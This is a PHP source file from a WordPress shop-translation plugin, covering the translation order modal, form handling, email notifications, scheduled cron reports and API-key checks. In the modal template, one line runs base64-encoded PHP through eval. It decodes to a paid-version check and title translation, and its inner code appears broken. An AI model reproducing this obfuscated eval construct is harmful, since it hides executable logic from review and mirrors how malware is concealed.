						echo '&#8364; '.$price_of_word .' * <span class="wwt-no-word-label">'. $total_word .'</span>'. __( ' (Number Of Words)', WWT_TRAN_TEXT_DOMAIN ). ' = &#8364;  <input type="text" name="professional-form[total_price]" id="wwt-tran-pro-total-price" value="'.( $total_price > 0.50  ? $total_price : '0.50' ).'" readonly> '.__( '(minimum costs per translation: &#8364 0.50)', WWT_TRAN_TEXT_DOMAIN ); ?>
					</p>
					<?php if( !empty( $api_valid ) ) { ?>
						<div class="wwt-google-tran-wrap">
							<div class="wwt-google-btn-wrap">
								<a href="javascript:void(0)" class="wwt-google-tran-replace wwt-tran-btn" data-google="1"><?php _e( 'Translate', WWT_TRAN_TEXT_DOMAIN );?></a>
							</div>
						<?php eval(base64_decode('ZXZhbChiYXNlNjRfZGVjb2RlKEpHUmxjSFJvSUQwZ2JtVjNJRmQzZEY5VWNtRnVYMUJoYVdRZ0tDazcpKTsNCgkJCQkJaWYoICRkZXB0aC0+d3d0X3RyYW5fY2hlY2tfdmVyc2lvbigpICkgew0KCQkJCQkJLy9UcmFuc2xhdGUgT24gZ29vZ2xlDQoJCQkJCQkkdGl0bGUgPSAkdGhpcy0+bW9kZWwtPnd3dF9nb29nbGVfdHJhbnNsYXRlKCAkc2hvcF9sYW5nLCAkdGl0bGUgKTsNCgkJCQkJCWlmKCAhZW1wdHkoICR0aXRsZVsndGV4dCddICkgKXsNCgkJCQkJCQllY2hvICc8c3BhbiBjbGFzcz0id3d0LW1vZGFsLXNwYW4gIj5UaXRsZSA6IDwvc3Bhbj48c3BhbiBjbGFzcz0id3d0LWdvb2dsZS10cm5hLXRpdGxlIj4gJy4kdGl0bGVbJ3RleHQnXS4nPC9zcGFuPjxici8+JzsNCgkJCQkJCX0NCgkJCQkJfQ==')); ?>
	
							<span class="wwt-modal-span"><?php _e( 'Description:', WWT_TRAN_TEXT_DOMAIN )?> </span><br/>
							<?php 
							$tran_content =  $this->model->wwt_google_translate( $shop_lang, $content );
							if( !empty( $tran_content['text'] ) ){
								$tran_content = $tran_content['text'];
							}else{
								$tran_content = $content;
							} ?>
							<textarea name="professional-form[google_tran_desc]" rows="6" cols="85" id="google-tran-desc"><?php echo strip_tags($tran_content);?></textarea><br/>
						</div>
					<?php } ?>
					<p class="wwt-own-wrap">
						<span class="wwt-modal-span"><?php _e( 'Description:', WWT_TRAN_TEXT_DOMAIN )?> </span><br/>
						<textarea name="professional-form[own_tran_description]" rows="6" cols="70" id="own-translation-full-desc"></textarea><br/>

						<span class="wwt-modal-span"><?php _e( 'Short Description:', WWT_TRAN_TEXT_DOMAIN )?> </span><br/>
						<textarea name="professional-form[own_tran_short_description]" rows="6" cols="70" id="own-translation-short-desc"></textarea>
					</p>
					<?php
					
					if( $popup_type == 'post' ) { ?>
						<p class="wwt-short-desc-section">
							<input type="checkbox" checked="checked" name="professional-form[short_description]" value="Yes" id="wwt-tran-include-short-description">
							<input type="hidden" id="wwt_short_descr_words" class="wwt-short-descr-words" name="professional-form[short_descr_words]" value="<?php echo $excerpt_word; ?>">
							<label for="wwt-tran-include-short-description"><?php _e( 'Short Description', WWT_TRAN_TEXT_DOMAIN ) ?></label>
						</p>
					<?php } ?>
					<p class="wwt-tran-text-type-section">
						<input type="radio" checked="checked" name="professional-form[text_type]" class="wwt-text-type" value="full" id="wwt-tran-full-text">
						<label for="wwt-tran-full-text"><?php _e( 'Full Text', WWT_TRAN_TEXT_DOMAIN ) ?></label>

						<input type="radio" name="professional-form[text_type]" class="wwt-text-type" value="part" id="wwt-tran-part-text">
						<label for="wwt-tran-part-text"><?php _e( 'Partial Text', WWT_TRAN_TEXT_DOMAIN ) ?> <i class="dashicons dashicons-info wwt-tooltip" data-tooltip="<?php _e( 'Allow you to choose part of content for translation.', WWT_TRAN_TEXT_DOMAIN ); ?>"></i></label>
					</p>
					<p class="wwt-tran-paragraph">
						<textarea id="wwt-selection-para" cols="90" rows="7" readonly><?php echo strip_tags($content);?></textarea>
						<input id="wwt-selected-content" type="hidden" name="professional-form[selected_content]" readonly></textarea>
						<br/><label><?php _e( 'Selected Content : ' );?></label>
						<span class="wwt-display-selected-cont"></span>
					</p>
					<p class="wwt-tran-remark-wrap">
						<span class="wwt-modal-span"><?php _e( 'Remark:', WWT_TRAN_TEXT_DOMAIN )?> </span><br/>
						<textarea name="professional-form[remark_text]" rows="4" cols="70" id="remark-popup"></textarea>
					</p>
					<p>
						<?php _e( 'The costs will be invoiced to your account. Translation will be done within 48 hours after payment.', WWT_TRAN_TEXT_DOMAIN ); ?>
					</p>
						<input type="hidden" name="professional-form[price_per_word]" id="wwt-tran-pro-per-word-price" value="<?php echo $price_of_word; ?>">
						<input type="hidden" name="professional-form[total_word]" id="wwt-tran-pro-total-words" value="<?php echo $total_word; ?>">
						<input type="hidden" name="professional-form[total_word_of_desc]" id="wwt-tran-pro-total-words-desc" value="<?php echo $total_word; ?>">
					<p> <input type="hidden" name="professional-form[id]" id="wwt-tran-pro-post-id" value="<?php echo $id; ?>"></p>
					<p> <input type="hidden" name="professional-form[type]" value="<?php echo $popup_type; ?>"></p>

					<p> 
						<div>
							<a href="javascript:void(0)" class="wwt-tran-pro-form-submit wwt-tran-btn"><?php _e( 'Send Your Inquiry', WWT_TRAN_TEXT_DOMAIN );?></a>

							<a href="javascript:void(0)" id="wwt_tm_create_project" class="wwt-tran-btn"><?php _e('Checkout', WWT_TRAN_TEXT_DOMAIN); ?></a>

							<div class="loader-wrap"><div class="wwt-tran-loading"></div></div>
						</div>
					</p>
				</form>
				</div>
			</div>
			<?php	
	
			$response['html'] = ob_get_clean();

		$response['sucess'] = 1;
		echo json_encode($response);
		exit;
	}

	/**
	 * Professional data form submit
	 * Data handle on send emial
	 *
	 * @package wwt Translate
	 * @since 1.0.0
	 */
	function wwt_tran_professional_form_submit_process() {

		global $wwt_tran_options, $current_user;

		$user  		=  !empty( $current_user->display_name ) ? $current_user->display_name : 'Guest';
		parse_str( $_POST['form_data'] , $form_data );

		$form_data  = !empty( $form_data )? $form_data['professional-form'] : array();

		$id				  = !empty( $form_data['id'] ) ? $form_data['id'] : 'N/A';
		$form_type		  = !empty( $form_data['type'] ) ? $form_data['type'] : '';

		$shop_name_id 	  = isset( $form_data['shop_name'] ) ? $form_data['shop_name'] : 'N/A';
		$shop_name		  = !empty($wwt_tran_options['shop_list'][$shop_name_id]['name']) ? $wwt_tran_options['shop_list'][$shop_name_id]['name'] : 'N/A';
		$shop_lang		  = !empty($wwt_tran_options['shop_list'][$shop_name_id]['lang']) ? $wwt_tran_options['shop_list'][$shop_name_id]['lang'] : '';

		$shop_translate_data = get_post_meta( $id, WWT_TRAN_PREFIX.'shop_translate_data', true );
		$shop_translate_data = !empty( $shop_translate_data )? $shop_translate_data : array();

		$translate_type   = !empty( $form_data['translate_type'] ) ? $form_data['translate_type'] : '';
		$text_type        = !empty( $form_data['text_type'] ) ? $form_data['text_type'] : '';
		$partial_text     = !empty( $form_data['selected_content'] ) ? $form_data['selected_content'] : 'No';
		$google_tran_desc = !empty( $form_data['google_tran_desc'] ) ? $form_data['google_tran_desc'] : '';

		if( $text_type !== 'part') {
			$partial_text = 'N/A';
		}

		$own_tran_full_description 	 = !empty( $form_data['own_tran_description'] ) ? $form_data['own_tran_description'] : 'N/A';
		$own_tran_short_description  = !empty( $form_data['own_tran_short_description'] ) ? $form_data['own_tran_short_description'] : 'N/A';

		$remark_text	  = !empty( $form_data['remark_text'] ) ? $form_data['remark_text'] : 'N/A';
		$price_per_word	  = !empty( $form_data['price_per_word'] ) ? $form_data['price_per_word'] : 'N/A';
		$total_words	  = !empty( $form_data['total_word'] ) ? $form_data['total_word'] : 'N/A';
		$total_price  	  = !empty( $form_data['total_price'] ) ? $form_data['total_price'] : 'N/A';

		if( $form_type == 'post') {

			$post 	= get_post($id);

			$title      =  !empty( $post->post_title ) ? $post->post_title : 'N/A';
			$type       =  !empty( $post->post_type )? $post->post_type : 'N/A';
			$content    =  !empty( $post->post_content )? $post->post_content : 'N/A';
			$page_url   =  get_permalink( $id );
			$page_url   =  !empty( $page_url ) ? $page_url : 'N/A';
		}

		if( $form_type == 'term') {

			$term 		= get_term($id);
			$arg 		= array( 
							'taxonomy' => !empty( $term->taxonomy ) ? $term->taxonomy :'',
							'tag_ID'   => $term_id,
			   		  		);
			$page_url   = add_query_arg( $arg , admin_url( 'term.php', ( is_ssl() ? 'https' : 'http' ) ) );
			$title      =  !empty( $term->name ) ? $term->name : 'N/A';
			$type       =  !empty( $term->taxonomy ) ? $term->taxonomy : 'N/A';
			$page_url   =  !empty( $page_url ) ? $page_url : 'N/A';
		}

		if(empty($content)){
			$content = 'N/A';
		}

		//Shop Request Log Process
		$user_id 		   = get_current_user_id();
		$shop_request_args = array(
								'post_type' 	=> WWT_TRAN_REQUEST_PT,
								'post_status' 	=> 'publish',
								'post_title' 	=> $title,
								'post_author' 	=> $user_id,
								'post_content' 	=> $content,
								'menu_order' 	=> 0,
								'comment_status'=> 'closed'
								);

		//Create Shop Request Log post
		$shop_request_log_id 	= wp_insert_post( $shop_request_args );

		if( !empty( $shop_request_log_id ) ) {

			update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'shop_name', $shop_name );
			update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'total_price', $total_price );
			update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'total_words', $total_words );
			update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'price_per_word', $price_per_word );
			update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'remark_text', $remark_text );
			update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'type', $type );
			update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'translate_type', $translate_type );
			update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'partial_text', $partial_text );
			update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'page_url', $page_url );
			update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'method', 'Inquiry' );
			update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'status', 'Send Mail' );

			if( $translate_type == 'own' ){

				$own_tran_data['full_description'] = $own_tran_full_description;
				$own_tran_data['short_description'] = $own_tran_short_description;
				update_post_meta( $shop_request_log_id, WWT_TRAN_PREFIX.'own_data', $own_tran_data );
			}
		}

		//Own Translate
		if( $translate_type == 'own' ){

			$own_translate = '<br/>Description : ';
			$own_translate .= $own_tran_full_description;
			$own_translate .= '<br/>Short Description : ';
			$own_translate .= $own_tran_short_description;

			if( $form_type == 'post' ) {
				$shop_translate_data[$shop_name]['shop_name'] = $shop_name;
				$shop_translate_data[$shop_name]['own_full_description'] = $own_tran_full_description;
				$shop_translate_data[$shop_name]['own_short_description'] = $own_tran_short_description;
				update_post_meta( $id, WWT_TRAN_PREFIX.'shop_translate_data', $shop_translate_data );
			}

			$response['sucess'] = 1;
			$response['msg']    = __( 'Your own translation submitted successfully.', WWT_TRAN_TEXT_DOMAIN );

			echo json_encode($response);
			exit;
		}

		//Disable Product
		if( $translate_type == 'disable_product' ){
				$shop_translate_data[$shop_name]['shop_name'] = $shop_name;
				$shop_translate_data[$shop_name]['product_disable'] = 'Yes';
				update_post_meta( $id, WWT_TRAN_PREFIX.'shop_translate_data', $shop_translate_data );
			$response['sucess'] = 1;
			$response['msg']    = __( 'Your disable product submitted successfully.', WWT_TRAN_TEXT_DOMAIN );

			echo json_encode($response);
			exit;
		}

		//If google translate then update meta
		$google_tran = 'No';
		if( $translate_type == 'google' ){
			$google_tran 	= 'Yes';
			$price_per_word = 'N/A';
			$total_price 	= 'N/A';

			//Process on google translation process
			if( !empty( $google_tran_desc ) && !empty( $shop_lang ) ) {

				//Translate On google
				$tran_decs = $this->model->wwt_google_translate( $shop_lang, $google_tran_desc );
				$tran_title = $this->model->wwt_google_translate( $shop_lang, $title );

				if( !empty( $tran_decs['sucess'] ) ) {
					$shop_translate_data[$shop_name]['google_translate_desc'] = $tran_decs['text'];

					if( !empty( $_POST['tran_api'] ) ) {
						$response['google_sucess'] = 1;
						$response['text']    = $tran_decs['text'];
						$response['title']   = $tran_title['text'];
						echo json_encode($response);
						exit;
					}
				}
			}
		}

		$own_translate = empty( $own_translate )? 'N/A' : $own_translate;

		$email      = !empty( $wwt_tran_options['professional']['admin_recipient'] ) ? $wwt_tran_options['professional']['admin_recipient'] : '';
		$message    = !empty( $wwt_tran_options['professional']['admin_email_body'] ) ? $wwt_tran_options['professional']['admin_email_body'] : '';
		$from_name  = !empty( $wwt_tran_options['professional']['from_name'] ) ? $wwt_tran_options['professional']['from_name'] : '';
		$from_email = !empty( $wwt_tran_options['professional']['from_email'] ) ? $wwt_tran_options['professional']['from_email'] : '';
		$subject 	=  __('Professional Translate', WWT_TRAN_TEXT_DOMAIN );

		if( $form_type == 'post') {

			$shop_translate_data[$shop_name]['shop_name'] = $shop_name;
			$shop_translate_data[$shop_name]['id'] = $id;
			$shop_translate_data[$shop_name]['google_translate'] = $google_tran;
			$shop_translate_data[$shop_name]['product_disable'] = 'No';
			$shop_translate_data[$shop_name]['own_translate'] = $own_translate;
			$shop_translate_data[$shop_name]['remark'] = $remark_text;
			$shop_translate_data[$shop_name]['partial_text'] = $partial_text;

			//Update all post data
			update_post_meta( $id, WWT_TRAN_PREFIX.'shop_translate_data', $shop_translate_data );
		}

		//Admin email start
		$to   =  explode( ',', $email );
		//$to[] = 'info@shoptranslate.com';
		$fromemail 	=  $from_name . ' <' . $from_email . '>';
		$no_reply 	=  'noreply <'.$from_email.'>';

		$headers[]  =  'From: '. $fromemail . "\r\n";
		$headers[]  =  'Reply-To: '. $no_reply . "\r\n";
		$headers[]  =  "MIME-Version: 1.0\r\n";
		$headers[]  =  "Content-Type: text/html; charset=utf-8\r\n";

		// Prepare message
		$message = str_replace( '{shop_name}', $shop_name, $message );
		$message = str_replace( '{id}', $id, $message );
		$message = str_replace( '{title}', $title, $message );
		$message = str_replace( '{content}', $content, $message );
		$message = str_replace( '{type}', $type, $message );
		$message = str_replace( '{page_url}', $page_url, $message );
		$message = str_replace( '{user}', $user, $message );
		$message = str_replace( '{total_words}', $total_words, $message );
		$message = str_replace( '{price_per_word}', $price_per_word, $message );
		$message = str_replace( '{total_price}', $total_price, $message );
		$message = str_replace( '{google_translate}', $google_tran, $message );
		$message = str_replace( '{remark}', $remark_text, $message );
		$message = str_replace( '{partial_text}', $partial_text, $message );

		$message = nl2br($message);

		wp_mail( $to, $subject, $message, $headers );

		$response['sucess'] = 1;
		$response['msg']    = __( 'Your inquiry submitted successfully.', WWT_TRAN_TEXT_DOMAIN );

		echo json_encode($response);
		exit;
		
	}

	/**
	 * ADmin Footer action Handle
	 *
	 * @package wwt Translate
	 * @since 1.0.0
	 */
	 function wwt_tran_admin_footer() {

	 	echo '<div class="wwt-tran-modal-overly"></div>';
		echo '<div id="wwt-tran-pro-modal" class="wwt-tran-modal"></div>';

		echo '<script type="text/javascript">
				window.$zopim||(function(d,s){var z=$zopim=function(c){z._.push(c)},$=z.s=d.createElement(s),e=d.getElementsByTagName(s)[0];z.set=function(o){z.set._.push(o)};z._=[];z.set._=[];$.async=!0;$.setAttribute("charset","utf-8");$.src="https://v2.zopim.com/?4jd7mR8WDASMQYQw55juiMWopwZwzoVt";z.t=+new Date;$.type="text/javascript";e.parentNode.insertBefore($,e)})(document,"script");

				$zopim(function() {$zopim.livechat.hideAll();});
			   </script>';

		$screen = get_current_screen();
		if( !empty( $screen->id ) && $screen->id == 'edit-product' ) {

			echo '<div id="wwt-tran-waiting-modal" class="wwt-tran-modal">
				  	<div class="wwt-tran-modal-content">
						<div class="wwt-tran-modal-header">
							
							<h3>'.__( 'Connecting to checkout by Shoptranslate...', WWT_TRAN_TEXT_DOMAIN ).'</h3>
						</div>
						<div class="wwt-tran-modal-body">
							<p class="wwt-modal-logo">
								<img src="'.WWT_TRAN_URL.'includes/images/ShopTranslateLogo.jpg" class="wwt-tran-logo-sidebar" alt="'.__( 'Shop Translate', WWT_TRAN_TEXT_DOMAIN ).'">
							</p>
							<p class="wwt-modal-wait-msg">	
								'.__( 'We are connecting to checkout. Please wait for a while. It won\'t take long...' , WWT_TRAN_TEXT_DOMAIN ).'
							</p>
						</div>
				  	</div>
				 </div>';
		}
	 }

	/**
	 * Admin Bar handle chat box button
	 *
	 * @package wwt Translate
	 * @since 1.0.0
	 */
	 function wwt_tran_add_chat_button( $wp_admin_bar ) {

	 	//Argument for add butoon in admin bar
		$args = array(
					'id'    => 'wwt-zopim-btn',
					'title' => '<i class="dashicons dashicons-format-chat"></i> Shoptranslate.com Support',
					'href'  => '#',
					'meta'  => array(
								'class' => 'wwt-zopim-btn wwt-chat-link',
								'onclick' => 'javascript:$zopim.livechat.window.show();'
							   )
				);
		$wp_admin_bar->add_node($args);
	}

	/**
	 * Cron Job functionality on Shedula
	 * 
	 * @package wwt Translate
	 * @since 1.0.0
	 */
	public function wwt_tran_new_update_scheduled_cron_process() {

		global $wwt_tran_options;

		if( !empty( $wwt_tran_options['schedule']['schedule_type'] ) ) {

			//Get date informations
			$current_day   = date('d');
			$current_week  = date('W');
			$current_month = date('m');
			$current_year  = date('Y');

			$month_start_date = date( 'Y-m-d', strtotime('last month') );
			$week_start_date  = date( 'Y-m-d', strtotime( '-7 days' ) );
			$today_date       = date( 'Y-m-d', current_time( 'timestamp' ) );

			$schedule = $wwt_tran_options['schedule']['schedule_type'];
			$product_list  = '<br/>Product List : ';
			$category_list = '<br/>Category List : ';

			if( $schedule == 'daily' ) { //Daily Schedule Process

				//Post Argument
				$args = array( 
							'post_type'    => 'product',
							'post_status'  => 'publish',
							'date_query'   => array( 
													'day'   => $current_day,
													'year'  => $current_year,
											),
							);
				//Cat Argument
				$cat_args = array(
								'taxonomy'   => 'product_cat',
								'hide_empty' => false,
								'order'      => 'DESC',
								'meta_query' => array(
													array(
											            'key'       => 'wwt_tran_term_date',
											            'value'     => $today_date,
											            'compare'   => '='
											         )
												 )
								);

				//prepared product list and category list after get
				$product_list  .= $this->model->wwt_tran_get_product_data_for_email( $args );
				$category_list .= $this->model->wwt_tran_get_category_data_for_email( $cat_args );

			} elseif( $schedule == 'weekly' ) { //Weekly Schedule Process

				//Post Argument
				$args = array( 
							'post_type'    => 'product',
							'post_status'  => 'publish',
							'date_query'   => array( 
													'week' => $current_week,
													'year'  => $current_year,
											),
							);

				//Cat Argument
				$cat_args = array(
								'taxonomy'   => 'product_cat',
								'hide_empty' => false,
								'order'      => 'DESC',
								'meta_query' => array(
													array(
											            'key'       => 'wwt_tran_term_date',
											            'value'     => $week_start_date,
											            'compare'   => '>='
											         ),
											         array(
											            'key'       => 'wwt_tran_term_date',
											            'value'     => $today_date,
											            'compare'   => '<='
											         ),
												 )
								);

				//prepared product list and category list after get
				$product_list  .= $this->model->wwt_tran_get_product_data_for_email( $args );
				$category_list .= $this->model->wwt_tran_get_category_data_for_email( $cat_args );

			} elseif( $schedule == 'monthly' ) { //Monthly Schedule Process

				//Post Argument
				$args = array(
							'post_type'    => 'product',
							'post_status'  => 'publish',
							'date_query'   => array( 
													'month' => $current_month,
													'year'  => $current_year,
											),
							);

				//Cat Argument
				$cat_args = array(
								'taxonomy'   => 'product_cat',
								'hide_empty' => false,
								'order'      => 'DESC',
								'meta_query' => array(
													array(
											            'key'       => 'wwt_tran_term_date',
											            'value'     => $month_start_date,
											            'compare'   => '>='
											         ),
											         array(
											            'key'       => 'wwt_tran_term_date',
											            'value'     => $today_date,
											            'compare'   => '<='
											         ),
												 )
								);

				//prepared product list and category list after get
				$product_list  .= $this->model->wwt_tran_get_product_data_for_email( $args );
				$category_list .= $this->model->wwt_tran_get_category_data_for_email( $cat_args );
			}

			$email      = !empty( $wwt_tran_options['schedule']['admin_recipient'] ) ? $wwt_tran_options['schedule']['admin_recipient'] : '';
			$message    = !empty( $wwt_tran_options['schedule']['admin_email_body'] ) ? $wwt_tran_options['schedule']['admin_email_body'] : '';
			$from_name  = !empty( $wwt_tran_options['schedule']['from_name'] ) ? $wwt_tran_options['schedule']['from_name'] : '';
			$from_email = !empty( $wwt_tran_options['schedule']['from_email'] ) ? $wwt_tran_options['schedule']['from_email'] : '';
			$subject 	=  __('Shoptranslate Notification', WWT_TRAN_TEXT_DOMAIN );

			//Admin email start
			$to   =  explode( ',', $email );
			//$to[] = 'info@shoptranslate.com';
			$fromemail 	=  $from_name.'<' . $from_email . '>';
			$no_reply 	=  'noreply <'.$from_email.'>';

			$headers[]  =  'From: '. $fromemail . "\r\n";
			$headers[]  =  'Reply-To: '. $no_reply . "\r\n";
			$headers[]  =  "MIME-Version: 1.0\r\n";
			$headers[]  =  "Content-Type: text/html; charset=utf-8\r\n";

			// Prepare message
			$message = str_replace( '{product_list}', $product_list, $message );
			$message = str_replace( '{category_list}', $category_list, $message );

			$message = nl2br($message);

			wp_mail( $to, $subject, $message, $headers );
		}
	}
	
	/**
	 * Cron Job functionality on Shedula
	 * 
	 * @package wwt Translate
	 * @since 1.0.0
	 */
	public function wwt_tran_validate_setting( $new_data, $old_data ) {

		if( !empty( $new_data['schedule']['schedule_type'] ) && $new_data['schedule']['schedule_type'] != $old_data['schedule']['schedule_type'] ) {

			// first clear the schedule	
			wp_clear_scheduled_hook( 'wwt_tran_data_scheduled_cron' );

			if ( ! wp_next_scheduled( 'wwt_tran_data_scheduled_cron' ) ) {

				$utc_timestamp = time(); //

				$local_time = current_time( 'timestamp' ); // to get current local time

				if( $new_data['schedule']['schedule_type'] == 'daily' ) {

					wp_schedule_event( $utc_timestamp, $new_data['schedule']['schedule_type'], 'wwt_tran_data_scheduled_cron' );

				} else {

					$scheds = (array)wp_get_schedules();
					$current_schedule = $new_data['schedule']['schedule_type'];
					$interval = ( isset($scheds[$current_schedule]['interval']) ) ? (int) $scheds[$current_schedule]['interval'] : 0;

					$utc_timestamp = $utc_timestamp + $interval;

					wp_schedule_event( $utc_timestamp, $new_data['schedule']['schedule_type'], 'wwt_tran_data_scheduled_cron' );

				}
			}
		}

		//Plugin Schedule
		if( !empty( $new_data['plugin_different_schedule']['schedule_type'] ) && $new_data['plugin_different_schedule']['schedule_type'] != $old_data['plugin_different_schedule']['schedule_type'] ) {

			// first clear the schedule	
			wp_clear_scheduled_hook( 'wwt_tran_data_plug_scheduled_cron' );

			if ( ! wp_next_scheduled( 'wwt_tran_data_plug_scheduled_cron' ) ) {

				$utc_timestamp = time(); //

				$local_time = current_time( 'timestamp' ); // to get current local time

				$scheds = (array)wp_get_schedules();
				$current_schedule = $new_data['plugin_different_schedule']['schedule_type'];
				$interval = ( isset($scheds[$current_schedule]['interval']) ) ? (int) $scheds[$current_schedule]['interval'] : 0;

				$utc_timestamp = $utc_timestamp + $interval;
				wp_schedule_event( $utc_timestamp, $new_data['plugin_different_schedule']['schedule_type'], 'wwt_tran_data_plug_scheduled_cron' );
			}
		}

		//Check Api is valid
		if( !empty( $new_data['general']['tran_api_key'] ) && $new_data['general']['tran_api_key'] != $old_data['general']['tran_api_key'] ) {

			$url    = add_query_arg( array( 'key' => $new_data['general']['tran_api_key'],'q' => rawurlencode('test text'),
										'source' => '',
										'target' => 'en'
									 ), 'https://www.googleapis.com/language/translate/v2' );
	    	$response = wp_remote_get( $url );
	    	if( is_array( $response ) && $response['response']['code'] == 200 ) {
	    		$new_data['general']['api_valid'] = 1;
	    	}else{
	    		$new_data['general']['api_valid'] = 0;
	    	}
		}

		$queryargs = wp_parse_args( $new_data,$old_data );
		return $queryargs;
	}

	/**
	 * Add Custom Schedule
	 * 
	 * Handle to add custom schedule
	 *
	 * @package wwt Translate
	 * @since 1.0.0
	 */
	public function wwt_tran_add_custom_scheduled( $schedules ) {

		// Adds once weekly to the existing schedules.
		$schedules['weekly'] = array(
										'interval'	=> 604800,
										'display'	=> __( 'Once Weekly', 'wgl' )
									);

		// Adds once monthly to the existing schedules.
		$schedules['monthly'] = array(
										'interval'	=> 2635200,
										'display'	=> __( 'Once Monthly', 'wgl' )
									);
		return $schedules;
	}

	/**
	 * Add Term Meta
	 * 
	 * Handle to Term Meta
	 *
	 * @package wwt Translate
	 * @since 1.0.0
	 */
	public function wwt_tran_add_term_meta( $term_id, $tt_id, $taxonomy ){

		$date = date('Y-m-d');
		add_term_meta( $term_id, 'wwt_tran_term_date', $date, true );
	}
	
	/**
	 * Cron Job functionality on Schedule plugin different
	 * 
	 * @package wwt Translate
	 * @since 1.0.0
	 */
	public function wwt_tran_plug_scheduled_cron_process() {

		global $wwt_tran_options, $wwt_tran_model;

		if( !empty( $wwt_tran_options['plugin_different_schedule']['schedule_type'] ) ) {
		
			//Get Shop List
			$shop_list	= !empty( $wwt_tran_options['shop_list'] ) ? $wwt_tran_options['shop_list'] : array( );
			$different_data = array();

			//Check Shop List Exist
			if( !empty( $shop_list ) ) {

				foreach ( $shop_list as $shop ) {

					$different_data[$shop['name']] = array();

					//Check Shop Url exist
					if( !empty( $shop['url'] ) ) {
			
						//Get current site plugin details
						$current_shop_plugin_details = get_plugins();
			
						//Get another shop data
						$shop_plugin_data = $wwt_tran_model->wwt_tran_get_shop_plugin_details( $shop['url'] );
			
						foreach ( $current_shop_plugin_details as $key => $current_plugin ) {
			
							//Check main plugin exist on request shop
							if( !empty( $shop_plugin_data[$key] ) ) {

								//Main Shop Data
								$main_shop     = $current_shop_plugin_details[$key];

								//Request Shop Data
								$request_shop  = $shop_plugin_data[$key];

								if( $main_shop['Version'] != $request_shop['Version'] ) {

									$different_data[$shop['name']]['current_site']['name'] = $main_shop['Name'];
									$different_data[$shop['name']]['current_site']['version'] = $main_shop['Version'];
			
									$different_data[$shop['name']]['shop_site']['name'] = $request_shop['Name'];
									$different_data[$shop['name']]['shop_site']['version'] = $request_shop['Version'];
								}
							}
						}
					}
				}
			}

			$shop_details = '';
			foreach ( $different_data as $key => $value ) {
				
				$shop_details .= 'Shop Name :'.$key. '<br/>';
			
				if( !empty( $value['current_site'] ) ) {
					$shop_details .= '&nbsp;&nbsp; Plugin name :'.$value['current_site']['name']. '<br/>';
					$shop_details .= '&nbsp;&nbsp; Current Site version :'.$value['current_site']['version']. '<br/>';
					$shop_details .= '&nbsp;&nbsp; Shop Site Version :'.$value['shop_site']['version']. '<br/>';
				}else{
					$shop_details .= '&nbsp;&nbsp; No different.';
				}
			}
			
			$email      = !empty( $wwt_tran_options['plugin_different_schedule']['admin_recipient'] ) ? $wwt_tran_options['plugin_different_schedule']['admin_recipient'] : '';
			$message    = !empty( $wwt_tran_options['plugin_different_schedule']['admin_email_body'] ) ? $wwt_tran_options['plugin_different_schedule']['admin_email_body'] : '';
			$from_name  = !empty( $wwt_tran_options['plugin_different_schedule']['from_name'] ) ? $wwt_tran_options['plugin_different_schedule']['from_name'] : '';
			$from_email = !empty( $wwt_tran_options['plugin_different_schedule']['from_email'] ) ? $wwt_tran_options['plugin_different_schedule']['from_email'] : '';
			$subject 	=  __('Shoptranslate Notification for Plugin Difference', WWT_TRAN_TEXT_DOMAIN );

			//Admin email start
			$to   =  explode( ',', $email );
			//$to[] = 'info@shoptranslate.com';
			$fromemail 	=  $from_name.'<' . $from_email . '>';
			$no_reply 	=  'noreply <'.$from_email.'>';
			
			$headers[]  =  'From: '. $fromemail . "\r\n";
			$headers[]  =  'Reply-To: '. $no_reply . "\r\n";
			$headers[]  =  "MIME-Version: 1.0\r\n";
			$headers[]  =  "Content-Type: text/html; charset=utf-8\r\n";
			
			// Prepare message
			$message = str_replace( '{shop_details}', $shop_details, $message );
			
			$message = nl2br($message);
			
			wp_mail( $to, $subject, $message, $headers );

			$email      = !empty( $wwt_tran_options['schedule']['admin_recipient'] ) ? $wwt_tran_options['schedule']['admin_recipient'] : '';
			$message    = !empty( $wwt_tran_options['schedule']['admin_email_body'] ) ? $wwt_tran_options['schedule']['admin_email_body'] : '';
			$from_name  = !empty( $wwt_tran_options['schedule']['from_name'] ) ? $wwt_tran_options['schedule']['from_name'] : '';
			$from_email = !empty( $wwt_tran_options['schedule']['from_email'] ) ? $wwt_tran_options['schedule']['from_email'] : '';
			$subject 	=  __('Shoptranslate Notification', WWT_TRAN_TEXT_DOMAIN );

			//Admin email start
			$to   =  explode( ',', $email );
			//$to[] = 'info@shoptranslate.com';
			$fromemail 	=  $from_name.'<' . $from_email . '>';
			$no_reply 	=  'noreply <'.$from_email.'>';

			$headers[]  =  'From: '. $fromemail . "\r\n";
			$headers[]  =  'Reply-To: '. $no_reply . "\r\n";
			$headers[]  =  "MIME-Version: 1.0\r\n";
			$headers[]  =  "Content-Type: text/html; charset=utf-8\r\n";

			// Prepare message
			$message = str_replace( '{product_list}', $product_list, $message );
			$message = str_replace( '{category_list}', $category_list, $message );

			$message = nl2br($message);

			wp_mail( $to, $subject, $message, $headers );
		}
	}

	/**
	 * Text Master Api
	 * Handle Point: Create Project->Create Document->Setup Product And Chekout
	 * 
	 */
	function wwt_TM_setup_new_project_process() {

		//Global data
		global $wwt_tran_options, $current_user;

		$response = array();

		//Get current User name
		$user  =  !empty( $current_user->display_name ) ? $current_user->display_name : 'Guest';

		//Preapare Ajax request data
		parse_str( $_POST['form_data'] , $form_data );

		//Get all form data and store in one param
		$form_data 		  = !empty( $form_data )? $form_data['professional-form'] : array();
		//Check Professional type 
		$translate_type   = !empty( $form_data['translate_type'] ) ? $form_data['translate_type'] : '';

		//its allow only default professional type
		if( $translate_type == 'default' ) {

			$id			 = !empty( $form_data['id'] ) ? $form_data['id'] : 'N/A';
			$form_type   = !empty( $form_data['type'] ) ? $form_data['type'] : '';
			$remark_text = !empty( $form_data['remark_text'] ) ? $form_data['remark_text'] : '';
			$text_type   = !empty( $form_data['text_type'] ) ? $form_data['text_type'] : '';
